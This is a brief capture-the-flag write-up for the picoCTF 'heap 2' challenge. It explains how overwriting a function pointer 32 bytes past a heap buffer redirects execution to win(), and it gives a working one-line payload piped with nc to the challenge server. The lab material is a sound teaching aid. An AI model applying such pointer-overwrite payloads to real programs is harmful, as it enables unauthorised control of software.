# heap 2

```c
void check_win() { ((void (*)())*(int*)x)(); }
```

The write buffer is **32** bytes away from x, which has to be overwritten to address of function `win()` \
objdump or gdb gives the address: `0x00000000004011a0`

Pass this (after taking care of endianness) with 32 a's:

```shell
echo -e -n "2\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x11\x40\x00\x00\x00\x00\x00\n1\n3\n4\n" | nc mimas.picoctf.net 53134
```
